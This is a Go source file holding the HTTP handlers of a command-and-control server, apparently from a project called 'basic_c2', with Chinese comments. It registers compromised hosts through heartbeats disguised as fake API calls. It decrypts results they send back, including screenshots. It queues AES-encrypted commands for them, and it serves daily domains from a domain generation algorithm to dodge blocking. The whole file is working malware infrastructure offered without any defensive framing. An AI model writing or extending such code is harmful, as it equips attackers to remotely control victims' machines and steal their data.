package handlers

import (
	"basic_c2/internal/config"
	"basic_c2/internal/crypto"
	"basic_c2/internal/dga"
	"basic_c2/internal/models"
	"basic_c2/server/storage"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"sort"
	"time"
)

// Handler C2 服务器的 HTTP 处理器
type Handler struct {
	store *storage.Memory
}

// NewHandler 创建新的处理器实例
func NewHandler(store *storage.Memory) *Handler {
	return &Handler{store: store}
}

// AgentHeartbeat 处理 Agent 心跳上报
func (h *Handler) AgentHeartbeat(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	// 读取请求 Body
	body, _ := io.ReadAll(r.Body)
	var req models.FakeAPIRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return
	}

	clientIP := r.RemoteAddr
	agentID := req.Hostname // 使用 Hostname 作为 ID

	// 检查是否是新主机
	if _, exists := h.store.GetAgent(agentID); !exists {
		fmt.Printf("[+] 新主机上线: %s (%s)\n", req.Hostname, clientIP)
	}

	// 处理 LastResult（如果有新回显，解密并更新）
	var lastResult = ""
	if old, ok := h.store.GetAgent(agentID); ok {
		lastResult = old.LastResult
	}
	
	if req.Token != "" {
		decrypted, err := crypto.Decrypt(req.Token, config.AESKey)
		if err == nil && decrypted != "" {
			lastResult = decrypted
			// 如果是截图数据，不打印太多日志
			if len(decrypted) < 100 {
				fmt.Printf("[Result from %s]: %s\n", agentID, decrypted)
			} else {
				fmt.Printf("[Result from %s]: (收到大数据包/截图: %d bytes)\n", agentID, len(decrypted))
			}
		}
	}

	// 更新内存状态
	currentAgent := &models.AgentInfo{
		ID:         agentID,
		IP:         clientIP,
		Hostname:   req.Hostname,
		LastSeen:   time.Now().Unix(),
		Status:     "active",
		LastResult: lastResult,
	}
	h.store.UpdateAgent(currentAgent)

	// 检查是否有待发指令
	cmdToSend := ""
	if cmd, ok := h.store.DequeueCommand(agentID); ok {
		cmdToSend = cmd
		fmt.Printf("[*] 命令下发给 %s: %s\n", agentID, cmd)
	}

	// 构造响应
	resp := models.FakeAPIResponse{Code: 200}
	if cmdToSend != "" {
		encryptedCmd, _ := crypto.Encrypt(cmdToSend, config.AESKey)
		resp.Data = encryptedCmd
	}
	json.NewEncoder(w).Encode(resp)
}

// GetAgents 获取主机列表（支持排序）
func (h *Handler) GetAgents(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Content-Type", "application/json")

	now := time.Now().Unix()
	list := h.store.GetAllAgents()

	// 更新状态（15秒无心跳判定为离线）
	for _, agent := range list {
		if now-agent.LastSeen > 15 {
			agent.Status = "offline"
		} else {
			agent.Status = "active"
		}
	}

	// 稳定排序：1. Active 在前  2. Hostname 字母序
	sort.Slice(list, func(i, j int) bool {
		if list[i].Status != list[j].Status {
			return list[i].Status == "active"
		}
		return list[i].Hostname < list[j].Hostname
	})

	json.NewEncoder(w).Encode(list)
}

// SendCommand 下发命令
func (h *Handler) SendCommand(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	
	var req models.CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		return
	}

	h.store.EnqueueCommand(req.ID, req.Cmd)
	fmt.Fprintf(w, "ok")
}

// DeleteAgent 删除主机
func (h *Handler) DeleteAgent(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	id := r.URL.Query().Get("id")

	h.store.DeleteAgent(id)
	
	fmt.Printf("[-] 主机已移除: %s\n", id)
	fmt.Fprintf(w, "deleted")
}

// [新增] 获取今日 DGA 域名
func ApiGetCurrentDGA(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Content-Type", "application/json")

	// 生成当天的 3 个域名
	domains := dga.GenerateDomains(config.DGACount)

	response := map[string]interface{}{
		"date":    time.Now().Format("2006-01-02"),
		"domains": domains, // 返回数组 ["https://...", "https://...", "https://..."]
	}

	json.NewEncoder(w).Encode(response)
}